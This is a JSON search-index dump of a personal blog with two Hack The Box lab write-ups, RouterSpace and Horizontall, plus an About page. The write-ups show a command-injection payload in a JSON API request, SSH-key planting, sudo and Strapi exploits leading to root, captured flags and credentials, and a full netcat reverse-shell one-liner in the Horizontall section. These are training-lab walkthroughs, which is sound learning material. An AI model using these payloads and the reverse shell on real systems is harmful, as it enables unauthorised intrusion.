[{"categories":["Linux Easy"],"content":" RouterSpace HTB Process Added routerspace.htb to /etc/hosts using sudo echo '\u003cip\u003e routerspace.htb' \u003e\u003e /etc/hosts Nmap Found two tcp open ports and no udp ports 22/tcp open ssh 80/tcp open http DirEnumeration ffuf and gobuster scan carried out on routerspace.htb =\u003e No useful dir founds VhostEnumeration No useful subdomains found http://routerspace.htb No actionable OSINT found Found a hyperlink to an apk =\u003e routerspace.apk Anbox Started anbox for testing the routerspace.apk Installed the apk using adb install routerspace.apk Configured the proxy to intercept the requests on port 8999 on all interfaces Configure the adb to send requests to the \u003cip\u003e:8999 =\u003e adb shell settings put global http_proxy 192.168.250.1:8999 Intercepted a POST request to /api/v4/monitoring/router/dev/check/deviceAccess Command Injection POST request had json in its body with parameter ip using operator such as \u0026, |, ; Foothold None of the reverse shell worked Most probably because of the ip tables configuration On enumeration, USER: Paul was found to have write privileges on .ssh Generated an ssh key pair using ssh-keygen and uploaded the public key to /home/paul/.ssh/authorized_keys Now using the private key we logged on the routerspace.htb Privilege Escalation Executed linpeas script found the sudo version vulnerable Searched for the exploit and executed it =\u003eCVE-2021-3156 ","date":"2022-03-07","objectID":"https://www.yashhacksstuff.tech/routerspace/:0:0","tags":["Linux","Easy","APK","Anbox","Active"],"title":"HTB Routerspace Writeup","uri":"https://www.yashhacksstuff.tech/routerspace/"},{"categories":["Linux Easy"],"content":"Enumeration ","date":"2022-03-07","objectID":"https://www.yashhacksstuff.tech/routerspace/:1:0","tags":["Linux","Easy","APK","Anbox","Active"],"title":"HTB Routerspace Writeup","uri":"https://www.yashhacksstuff.tech/routerspace/"},{"categories":["Linux Easy"],"content":"Nmap Scans Found two tcp ports open 22/tcp ssh 80/tcp http Results cororborated by masscan sudo nmap -A -sC -Pn routerspace.htb -oN nmap.adc [sudo] password for babayaga: Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower. Starting Nmap 7.91 ( https://nmap.org ) at 2022-03-06 15:23 IST Nmap scan report for routerspace.htb (10.129.151.201) Host is up (0.16s latency). Not shown: 998 filtered ports PORT STATE SERVICE VERSION 22/tcp open ssh (protocol 2.0) | fingerprint-strings: | NULL: |_ SSH-2.0-RouterSpace Packet Filtering V1 | ssh-hostkey: | 3072 f4:e4:c8:0a:a6:af:66:93:af:69:5a:a9:bc:75:f9:0c (RSA) | 256 7f:05:cd:8c:42:7b:a9:4a:b2:e6:35:2c:c4:59:78:02 (ECDSA) |_ 256 2f:d7:a8:8b:be:2d:10:b0:c9:b4:29:52:a8:94:24:78 (ED25519) 80/tcp open http | fingerprint-strings: | FourOhFourRequest: | HTTP/1.1 200 OK | X-Powered-By: RouterSpace | X-Cdn: RouterSpace-10471 | Content-Type: text/html; charset=utf-8 | Content-Length: 79 | ETag: W/\"4f-UUpLZjWmW065QhEa4gf63Kfxs/I\" | Date: Sun, 06 Mar 2022 09:53:40 GMT | Connection: close | Suspicious activity detected !!! {RequestID: t nYh 4l l S ct m ny Cr } | GetRequest: | HTTP/1.1 200 OK | X-Powered-By: RouterSpace | X-Cdn: RouterSpace-59306 | Accept-Ranges: bytes | Cache-Control: public, max-age=0 | Last-Modified: Mon, 22 Nov 2021 11:33:57 GMT | ETag: W/\"652c-17d476c9285\" | Content-Type: text/html; charset=UTF-8 | Content-Length: 25900 | Date: Sun, 06 Mar 2022 09:53:38 GMT | Connection: close | \u003c!doctype html\u003e | \u003chtml class=\"no-js\" lang=\"zxx\"\u003e | \u003chead\u003e | \u003cmeta charset=\"utf-8\"\u003e | \u003cmeta http-equiv=\"x-ua-compatible\" content=\"ie=edge\"\u003e | \u003ctitle\u003eRouterSpace\u003c/title\u003e | \u003cmeta name=\"description\" content=\"\"\u003e | \u003cmeta name=\"viewport\" content=\"width=device-width, initial-scale=1\"\u003e | \u003clink rel=\"stylesheet\" href=\"css/bootstrap.min.css\"\u003e | \u003clink rel=\"stylesheet\" href=\"css/owl.carousel.min.css\"\u003e | \u003clink rel=\"stylesheet\" href=\"css/magnific-popup.css\"\u003e | \u003clink rel=\"stylesheet\" href=\"css/font-awesome.min.css\"\u003e | \u003clink rel=\"stylesheet\" href=\"css/themify-icons.css\"\u003e | HTTPOptions: | HTTP/1.1 200 OK | X-Powered-By: RouterSpace | X-Cdn: RouterSpace-86858 | Allow: GET,HEAD,POST | Content-Type: text/html; charset=utf-8 | Content-Length: 13 | ETag: W/\"d-bMedpZYGrVt1nR4x+qdNZ2GqyRo\" | Date: Sun, 06 Mar 2022 09:53:39 GMT | Connection: close | GET,HEAD,POST | RTSPRequest, X11Probe: | HTTP/1.1 400 Bad Request |_ Connection: close |_http-title: RouterSpace |_http-trane-info: Problem with XML parsing of /evox/about 2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service : ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)============== SF-Port22-TCP:V=7.91%I=7%D=3/6%Time=622484A0%P=x86_64-pc-linux-gnu%r(NULL, SF:29,\"SSH-2\\.0-RouterSpace\\x20Packet\\x20Filtering\\x20V1\\r\\n\"); ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)============== SF-Port80-TCP:V=7.91%I=7%D=3/6%Time=622484A0%P=x86_64-pc-linux-gnu%r(GetRe SF:quest,13E4,\"HTTP/1\\.1\\x20200\\x20OK\\r\\nX-Powered-By:\\x20RouterS SF:iption\\\"\\x20content=\\\"\\\"\u003e\\n\\x20\\x20\\x20\\x20\u003cmeta\\x20name=\\\"viewport\\\"\\x SF:20content=\\\"width=device-width,\\x20initial-scale=1\\\"\u003e\\n\\n\\x20\\x20\\x20\\x SF:20\u003clink\\x20rel=\\\"stylesheet\\\"\\x20href=\\\"css/bootstrap\\.min\\.css\\\"\u003e\\n\\x2 SF:0\\x20\\x20\\x20\u003clink\\x20rel=\\\"stylesheet\\\"\\x20href=\\\"css/owl\\.carousel\\.m SF:in\\.css\\\"\u003e\\n\\x20\\x20\\x20\\x20\u003clink\\x20rel=\\\"stylesheet\\\"\\x20href=\\\"css/m SF:agnific-popup\\.css\\\"\u003e\\n\\x20\\x20\\x20\\x20\u003clink\\x20rel=\\\"stylesheet SF:GrVt1nR4x\\+qdNZ2GqyRo\\\"\\r\\nDate:\\x20Sun,\\x2006\\x20Mar\\x202022\\x2009:53: ; Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Aggressive OS guesses: Linux 5.4 (92%), Linux 4.15 - 5.6 (90%), Crestron XPanel control system (90%), Linux 5.3 - 5.4 (90%), Linux 2.6.32 (90%), Linux 5.0 (89%), Linux 5.0 - 5.3 (89%), Linux 5.0 - 5.4 (88%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%) No exact OS","date":"2022-03-07","objectID":"https://www.yashhacksstuff.tech/routerspace/:1:1","tags":["Linux","Easy","APK","Anbox","Active"],"title":"HTB Routerspace Writeup","uri":"https://www.yashhacksstuff.tech/routerspace/"},{"categories":["Linux Easy"],"content":"FFUF No useful directories found Recived valid response for garbage input with no similarity accross the response to deploy the filters ffuf -u http://routerspace.htb/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .php,.txt,.js,.html -of md -o dir.common.routerspace -c /'___\\ /'___\\ /'___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive \u003c3 ________________________________________________ :: Method : GET :: URL : http://routerspace.htb/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/dirb/common.txt :: Extensions : .php .txt .js .html :: Output file : dir.common.routerspace :: File format : md :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 ________________________________________________ .bash_history [Status: 200, Size: 68, Words: 12, Lines: 3] .config.html [Status: 200, Size: 73, Words: 15, Lines: 7] .cache.html [Status: 200, Size: 69, Words: 15, Lines: 6] .cvs.html [Status: 200, Size: 71, Words: 15, Lines: 2] .cvs.php [Status: 200, Size: 71, Words: 17, Lines: 4] .config [Status: 200, Size: 70, Words: 16, Lines: 5] .cvsignore [Status: 200, Size: 67, Words: 16, Lines: 4] .cvs.js [Status: 200, Size: 62, Words: 16, Lines: 2] .cvsignore.txt [Status: 200, Size: 78, Words: 16, Lines: 3] .bashrc.txt [Status: 200, Size: 71, Words: 15, Lines: 5] .forward.js [Status: 200, Size: 68, Words: 13, Lines: 8] .bash_history.txt [Status: 200, Size: 73, Words: 15, Lines: 7] .cache.php [Status: 200, Size: 82, Words: 17, Lines: 8] .cache [Status: 200, Size: 70, Words: 17, Lines: 6] .cvsignore.js [Status: 200, Size: 74, Words: 15, Lines: 8] .bash_history.js [Status: 200, Size: 71, Words: 16, Lines: 6] .txt [Status: 200, Size: 80, Words: 18, Lines: 5] .cvs.txt [Status: 200, Size: 74, Words: 17, Lines: 7] .bashrc.js [Status: 200, Size: 73, Words: 16, Lines: 8] .config.txt [Status: 200, Size: 78, Words: 20, Lines: 8] .html [Status: 200, Size: 73, Words: 14, Lines: 8] .forward.html [Status: 200, Size: 76, Words: 18, Lines: 1] .cvsignore.html [Status: 200, Size: 76, Words: 17, Lines: 6] .bashrc [Status: 200, Size: 72, Words: 15, Lines: 5] .config.js [Status: 200, Size: 69, Words: 14, Lines: 7] .bash_history.php [Status: 200, Size: 77, Words: 19, Lines: 5] .bash_history.html [Status: 200, Size: 71, Words: 14, Lines: 2] .forward.php [Status: 200, Size: 69, Words: 16, Lines: 1] .forward [Status: 200, Size: 69, Words: 13, Lines: 1] .bashrc.html [Status: 200, Size: 72, Words: 14, Lines: 1] .bashrc.php [Status: 200, Size: 72, Words: 14, Lines: 6] ","date":"2022-03-07","objectID":"https://www.yashhacksstuff.tech/routerspace/:1:2","tags":["Linux","Easy","APK","Anbox","Active"],"title":"HTB Routerspace Writeup","uri":"https://www.yashhacksstuff.tech/routerspace/"},{"categories":["Linux Easy"],"content":"RouterSpace Webpage ","date":"2022-03-07","objectID":"https://www.yashhacksstuff.tech/routerspace/:2:0","tags":["Linux","Easy","APK","Anbox","Active"],"title":"HTB Routerspace Writeup","uri":"https://www.yashhacksstuff.tech/routerspace/"},{"categories":["Linux Easy"],"content":"Homepage On logging on to http://routerspace.htb Homepage ","date":"2022-03-07","objectID":"https://www.yashhacksstuff.tech/routerspace/:2:1","tags":["Linux","Easy","APK","Anbox","Active"],"title":"HTB Routerspace Writeup","uri":"https://www.yashhacksstuff.tech/routerspace/"},{"categories":["Linux Easy"],"content":"Additional Links Found Downloaded the apk for further analysis RouterSpace.apk ","date":"2022-03-07","objectID":"https://www.yashhacksstuff.tech/routerspace/:2:2","tags":["Linux","Easy","APK","Anbox","Active"],"title":"HTB Routerspace Writeup","uri":"https://www.yashhacksstuff.tech/routerspace/"},{"categories":["Linux Easy"],"content":"Installing Anbox and APK ┌─[babayaga@babayaga-virtualbox]─[~/Downloads] └──╼ $adb install RouterSpace.apk * daemon not running; starting now at tcp:5037 * daemon started successfully Performing Streamed Install Success RouterSpace.apk in Anbox ","date":"2022-03-07","objectID":"https://www.yashhacksstuff.tech/routerspace/:2:3","tags":["Linux","Easy","APK","Anbox","Active"],"title":"HTB Routerspace Writeup","uri":"https://www.yashhacksstuff.tech/routerspace/"},{"categories":["Linux Easy"],"content":"Proxy settings Burp was configured such that it will intercept the requests on port 8999 from all the interfaces I forgot to take the screenshop but you can follow these steps: Proxy\u003eOptions\u003eProxyListenser\u003eAdd and configure suitably To Anbox to send request on 8999, read the following link It is not possible to set proxy settings for network connection · Issue #398 · anbox/anbox · GitHub ─[babayaga@babayaga-virtualbox]─[~/Desktop] └──╼ $adb shell settings put global http_proxy 192.168.250.1:8999 Reference for configuration* Reference Guide to Proxy Configuration ","date":"2022-03-07","objectID":"https://www.yashhacksstuff.tech/routerspace/:2:4","tags":["Linux","Easy","APK","Anbox","Active"],"title":"HTB Routerspace Writeup","uri":"https://www.yashhacksstuff.tech/routerspace/"},{"categories":["Linux Easy"],"content":"Request Request the routerspace.apk was sending POST /api/v4/monitoring/router/dev/check/deviceAccess HTTP/1.1 accept: application/json, text/plain, */* user-agent: RouterSpaceAgent Content-Type: application/json Content-Length: 16 Host: routerspace.htb Connection: close Accept-Encoding: gzip, deflate {\"ip\":\"0.0.0.0\"} Captured Request ","date":"2022-03-07","objectID":"https://www.yashhacksstuff.tech/routerspace/:2:5","tags":["Linux","Easy","APK","Anbox","Active"],"title":"HTB Routerspace Writeup","uri":"https://www.yashhacksstuff.tech/routerspace/"},{"categories":["Linux Easy"],"content":"Foothold Request is vulnerable to command injection Vulnerable to Command Injection Request POST /api/v4/monitoring/router/dev/check/deviceAccess HTTP/1.1 accept: application/json, text/plain, */* user-agent: RouterSpaceAgent Content-Type: application/json Content-Length: 25 Host: routerspace.htb Connection: close Accept-Encoding: gzip, deflate {\"ip\":\"0.0.0.0 | whoami\"} Response HTTP/1.1 200 OK X-Powered-By: RouterSpace X-Cdn: RouterSpace-7530 Content-Type: application/json; charset=utf-8 Content-Length: 8 ETag: W/\"8-qTM+b2Uq+FmQphCm7m1RM+pENkU\" Date: Sun, 06 Mar 2022 13:33:23 GMT Connection: close \"paul\\n\" ","date":"2022-03-07","objectID":"https://www.yashhacksstuff.tech/routerspace/:2:6","tags":["Linux","Easy","APK","Anbox","Active"],"title":"HTB Routerspace Writeup","uri":"https://www.yashhacksstuff.tech/routerspace/"},{"categories":["Linux Easy"],"content":"Foothold No request for reverse shell worked But /home/paul/.ssh had write privileges Created an ssh key pair ┌─[babayaga@babayaga-virtualbox]─[~/.ssh] └──╼ $ssh-keygen Generating public/private rsa key pair. Enter file in which to save the key (/home/babayaga/.ssh/id_rsa): tmp Enter passphrase (empty for no passphrase): Enter same passphrase again: Your identification has been saved in forRouterSpace Your public key has been saved in forRouterSpace.pub The key fingerprint is: SHA256:22ZtDCb89y6FRut4jEgFTkumJ1owa7TZJXcri3o1AvM babayaga@babayaga-virtualbox The key's randomart image is: +---[RSA 3072]----+ | | | + . B . | | . B X + . | | B =.= o . | | . * +S+o. o | | . E =* ++ . | | . +.o=*=. | | . . .ooo=. | | . . oo | +----[SHA256]-----+ Appended the id_rsa.pub to /home/paul/.ssh/authorized_keys on routerspace.htb Appending keys to authorized_keys on routerspace.htb Logged in using id_rsa (private key) sudo ssh -i tmp paul@routerspace.htb [sudo] password for babayaga: The authenticity of host 'routerspace.htb (10.129.152.7)' can't be established. ECDSA key fingerprint is SHA256:M4jDfH65U/Fw7jjmKhTZcb9LgW/gi23OjcLjM1bA5UY. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added 'routerspace.htb,10.129.152.7' (ECDSA) to the list of known hosts. Enter passphrase for key 'tmp': Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-90-generic x86_64) UserLogin ","date":"2022-03-07","objectID":"https://www.yashhacksstuff.tech/routerspace/:3:0","tags":["Linux","Easy","APK","Anbox","Active"],"title":"HTB Routerspace Writeup","uri":"https://www.yashhacksstuff.tech/routerspace/"},{"categories":["Linux Easy"],"content":"User Flag paul@routerspace:~$ cat user.txt 3b53f478b34b94d32ea6b38ed6815a30 ","date":"2022-03-07","objectID":"https://www.yashhacksstuff.tech/routerspace/:3:1","tags":["Linux","Easy","APK","Anbox","Active"],"title":"HTB Routerspace Writeup","uri":"https://www.yashhacksstuff.tech/routerspace/"},{"categories":["Linux Easy"],"content":"Privilege Escalation IP tables config prohibiting outgoing request, so could not get a reverse shell and can’t use curl or wget to tranferfile by creating a web server locally Outbound connection banned maybe some iptables config Transfered the linpeas.sh using scp as curl and wget wouldn’t have worked because of iptables config ┌─[✗]─[babayaga@babayaga-virtualbox]─[/opt/Scripts] └──╼ $sudo scp -i /home/babayaga/.ssh/tmp linpeas.sh paul@routerspace.htb:/home/paul/ Enter passphrase for key '/home/babayaga/.ssh/tmp': linpeas.sh 100% 746KB 36.8KB/s 00:20 ","date":"2022-03-07","objectID":"https://www.yashhacksstuff.tech/routerspace/:4:0","tags":["Linux","Easy","APK","Anbox","Active"],"title":"HTB Routerspace Writeup","uri":"https://www.yashhacksstuff.tech/routerspace/"},{"categories":["Linux Easy"],"content":"Executing Linpeas.sh Vulnerable Sudo version Sudo version exploit CVE-2021-3156/exploit_nss.py at main · worawit/CVE-2021-3156 · GitHub =\u003e Executed exploit and got root flag paul@routerspace:~$ python3 exploit.py # ls exploit.py libnss_X linpeas.sh snap user.txt # whoami root # cd /root # ls root.txt # cat root.txt e741e9561463f0227c04aacb069e1cec # Root Access ","date":"2022-03-07","objectID":"https://www.yashhacksstuff.tech/routerspace/:4:1","tags":["Linux","Easy","APK","Anbox","Active"],"title":"HTB Routerspace Writeup","uri":"https://www.yashhacksstuff.tech/routerspace/"},{"categories":null,"content":"I am a perpetual learner, investigator of nerdy stuff and a penetration tester in making. Kevin Mitnik I was addicted to hacking, more for the intellectual challenge, the curiosity, the seduction of adventure; not for stealing, or causing damage or writing computer viruses. Want to know more about me? Head over to Linkedin to checkout my certifications and skills. ","date":"2022-03-05","objectID":"https://www.yashhacksstuff.tech/about/:0:0","tags":null,"title":"About","uri":"https://www.yashhacksstuff.tech/about/"},{"categories":["Linux Easy"],"content":" Horizontall Process Carried out an nmap scan found two ports open 22/tcp open ssh 80/tcp open http The ssh version was not vulnerable. The webpage at horizontal.htb was static and no actionable/useful OSINT was present Directory enumeration carried out using two wordlists dirb/common.txt dirbuster/subdirectory-list-2.3-medium.txt No interesting subdirectories. Subsequently vhost enumeration was carried out. ~api-prod~ subdomain found. Directory enumeration again carried out. Directories found: admin reviews users connect etc index.html was again a static webpage. The /admin subdirectory was intresting. It had a strapi pannel. The strapi application is vulnerable to unauthenticated RCE Using the exploit. An admin account was created credentials admin:SuperSecretPasssword1 The exploit also gave access to console for RCE. The consle did not return any ouput for the commands to verify the commands were being executed. I tested out for Blind RCE. Started a python webserver on my machine. Sent a GET Request using the console to my webserver. It confirmed existence of Blind RCE. I levereaged the console to get a reverse netcat shell Subsequently stablized the shell and read the user flag Privilege Escalation Used the LinPeas.sh to enumerate the system found it vulnerable to CVE-2021-4034. Found an exploit Executed it and escalated to root. Et voila read the root.txt. ","date":"2022-02-04","objectID":"https://www.yashhacksstuff.tech/firstpost/:0:0","tags":["Easy","Linux","Retired"],"title":"HTB Horizontall Writeup","uri":"https://www.yashhacksstuff.tech/firstpost/"},{"categories":["Linux Easy"],"content":"1. Enumeration ","date":"2022-02-04","objectID":"https://www.yashhacksstuff.tech/firstpost/:1:0","tags":["Easy","Linux","Retired"],"title":"HTB Horizontall Writeup","uri":"https://www.yashhacksstuff.tech/firstpost/"},{"categories":["Linux Easy"],"content":"1.1 Nmap 80/tcp open http nginx 1.14.0 (Ubuntu) 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) No UDP port open sudo nmap -sC -A -Pn 10.129.161.165 -T4 -oN nmap.ad Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower. Starting Nmap 7.91 ( https://nmap.org ) at 2022-02-03 23:44 IST Nmap scan report for horizontall.htb (10.129.161.165) Host is up (0.19s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 ee:77:41:43:d4:82:bd:3e:6e:6e:50:cd:ff:6b:0d:d5 (RSA) | 256 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 (ECDSA) |_ 256 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 (ED25519) 80/tcp open http nginx 1.14.0 (Ubuntu) |_http-server-header: nginx/1.14.0 (Ubuntu) |_http-title: horizontall No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.91%E=4%D=2/3%OT=22%CT=1%CU=40479%PV=Y%DS=2%DC=T%G=Y%TM=61FC1B9A OS:%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=108%TI=Z%CI=Z%II=I%TS=A)OPS( OS:O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST11 OS:NW7%O6=M505ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN( OS:R=Y%DF=Y%T=40%W=FAF0%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R= OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F= OS:R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%R OS:UCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S) Network Distance: 2 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 111/tcp) HOP RTT ADDRESS 1 197.81 ms 10.10.14.1 2 201.86 ms horizontall.htb (10.129.161.165) OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 37.66 seconds ","date":"2022-02-04","objectID":"https://www.yashhacksstuff.tech/firstpost/:1:1","tags":["Easy","Linux","Retired"],"title":"HTB Horizontall Writeup","uri":"https://www.yashhacksstuff.tech/firstpost/"},{"categories":["Linux Easy"],"content":"1.2 Directory Enumeration ffuf -u http://horizontall.htb/FUZZ -w /usr/share/wordlists/dirb/common.txt -c -of ffuf/horz.common.md /'___\\ /'___\\ /'___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive \u003c3 ________________________________________________ :: Method : GET :: URL : http://horizontall.htb/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/dirb/common.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 ________________________________________________ [Status: 200, Size: 901, Words: 43, Lines: 2] css [Status: 301, Size: 194, Words: 7, Lines: 8] favicon.ico [Status: 200, Size: 4286, Words: 8, Lines: 1] img [Status: 301, Size: 194, Words: 7, Lines: 8] index.html [Status: 200, Size: 901, Words: 43, Lines: 2] js [Status: 301, Size: 194, Words: 7, Lines: 8] :: Progress: [4614/4614] :: Job [1/1] :: 262 req/sec :: Duration: [0:00:21] :: Errors: 0 : ","date":"2022-02-04","objectID":"https://www.yashhacksstuff.tech/firstpost/:1:2","tags":["Easy","Linux","Retired"],"title":"HTB Horizontall Writeup","uri":"https://www.yashhacksstuff.tech/firstpost/"},{"categories":["Linux Easy"],"content":"1.3 Vhost Enumeration ffuf -u http://horizontall.htb -H \"Host: FUZZ.horizontall.htb\" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -of md -o vhost.horz -fs 194 /'___\\ /'___\\ /'___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive \u003c3 ________________________________________________ :: Method : GET :: URL : http://horizontall.htb :: Wordlist : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt :: Header : Host: FUZZ.horizontall.htb :: Output file : vhost.horz :: File format : md :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 :: Filter : Response size: 194 ________________________________________________ www [Status: 200, Size: 901, Words: 43, Lines: 2] api-prod [Status: 200, Size: 413, Words: 76, Lines: 20] ","date":"2022-02-04","objectID":"https://www.yashhacksstuff.tech/firstpost/:1:3","tags":["Easy","Linux","Retired"],"title":"HTB Horizontall Writeup","uri":"https://www.yashhacksstuff.tech/firstpost/"},{"categories":["Linux Easy"],"content":"2. http://horizonal.htb Homepage Static website No actionable or useful OSINT ","date":"2022-02-04","objectID":"https://www.yashhacksstuff.tech/firstpost/:2:0","tags":["Easy","Linux","Retired"],"title":"HTB Horizontall Writeup","uri":"https://www.yashhacksstuff.tech/firstpost/"},{"categories":["Linux Easy"],"content":"3. api.-prod.-horizontall.htb ","date":"2022-02-04","objectID":"https://www.yashhacksstuff.tech/firstpost/:3:0","tags":["Easy","Linux","Retired"],"title":"HTB Horizontall Writeup","uri":"https://www.yashhacksstuff.tech/firstpost/"},{"categories":["Linux Easy"],"content":"3.1 Homepage ![[Pasted image 20220204003329.png]] ","date":"2022-02-04","objectID":"https://www.yashhacksstuff.tech/firstpost/:3:1","tags":["Easy","Linux","Retired"],"title":"HTB Horizontall Writeup","uri":"https://www.yashhacksstuff.tech/firstpost/"},{"categories":["Linux Easy"],"content":"3.2 Directory Enumeration admin, ADMIN, Admin users connect robots.txt index.html ffuf -u http://api-prod.horizontall.htb/FUZZ/ -w /usr/share/wordlists/dirb/common.txt -of md -o dir.api-prod.horz.common /'___\\ /'___\\ /'___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive \u003c3 ________________________________________________ :: Method : GET :: URL : http://api-prod.horizontall.htb/FUZZ/ :: Wordlist : FUZZ: /usr/share/wordlists/dirb/common.txt :: Output file : dir.api-prod.horz.common :: File format : md :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 ________________________________________________ [Status: 200, Size: 413, Words: 76, Lines: 20] admin [Status: 200, Size: 854, Words: 98, Lines: 17] ADMIN [Status: 200, Size: 854, Words: 98, Lines: 17] Admin [Status: 200, Size: 854, Words: 98, Lines: 17] connect [Status: 403, Size: 60, Words: 1, Lines: 1] index.html [Status: 200, Size: 413, Words: 76, Lines: 20] robots.txt [Status: 200, Size: 121, Words: 19, Lines: 4] reviews [Status: 200, Size: 507, Words: 21, Lines: 1] users [Status: 403, Size: 60, Words: 1, Lines: 1] :: Progress: [4614/4614] :: Job [1/1] :: 235 req/sec :: Duration: [0:00:23] :: Errors: 0 :: ","date":"2022-02-04","objectID":"https://www.yashhacksstuff.tech/firstpost/:3:2","tags":["Easy","Linux","Retired"],"title":"HTB Horizontall Writeup","uri":"https://www.yashhacksstuff.tech/firstpost/"},{"categories":["Linux Easy"],"content":"3.3 Login portal Login Portal ","date":"2022-02-04","objectID":"https://www.yashhacksstuff.tech/firstpost/:3:3","tags":["Easy","Linux","Retired"],"title":"HTB Horizontall Writeup","uri":"https://www.yashhacksstuff.tech/firstpost/"},{"categories":["Linux Easy"],"content":"3.4 Vulnerability Strapi CMS 3.0.0-beta.17.4 - Remote Code Execution (RCE) (Unauthenticated) - Multiple webapps Exploit (exploit-db.com) Version Identification ","date":"2022-02-04","objectID":"https://www.yashhacksstuff.tech/firstpost/:3:4","tags":["Easy","Linux","Retired"],"title":"HTB Horizontall Writeup","uri":"https://www.yashhacksstuff.tech/firstpost/"},{"categories":["Linux Easy"],"content":"4. Foothold ","date":"2022-02-04","objectID":"https://www.yashhacksstuff.tech/firstpost/:4:0","tags":["Easy","Linux","Retired"],"title":"HTB Horizontall Writeup","uri":"https://www.yashhacksstuff.tech/firstpost/"},{"categories":["Linux Easy"],"content":"4.1 Shell Blind RCE +] Checking Strapi CMS Version running [+] Seems like the exploit will work!!! [+] Executing exploit [+] Password reset was successfully [+] Your email is: admin@horizontall.htb [+] Your new credentials are: admin:SuperStrongPassword1 [+] Your authenticated JSON Web Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjQzOTUyNzU2LCJleHAiOjE2NDY1NDQ3NTZ9.ucoeJpyivBWFaRCG8IAmfXUEH_2Q0emD9yBqckOkmfI It does work as I looged GET request on web server. I had to do this to ensure that blind RCE was working. Verifing Blind RCE ","date":"2022-02-04","objectID":"https://www.yashhacksstuff.tech/firstpost/:4:1","tags":["Easy","Linux","Retired"],"title":"HTB Horizontall Writeup","uri":"https://www.yashhacksstuff.tech/firstpost/"},{"categories":["Linux Easy"],"content":"4.2 Reverse Shell Shell used rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u003e\u00261|nc 10.10.14.20 4242 \u003e/tmp/f Reverse Shell 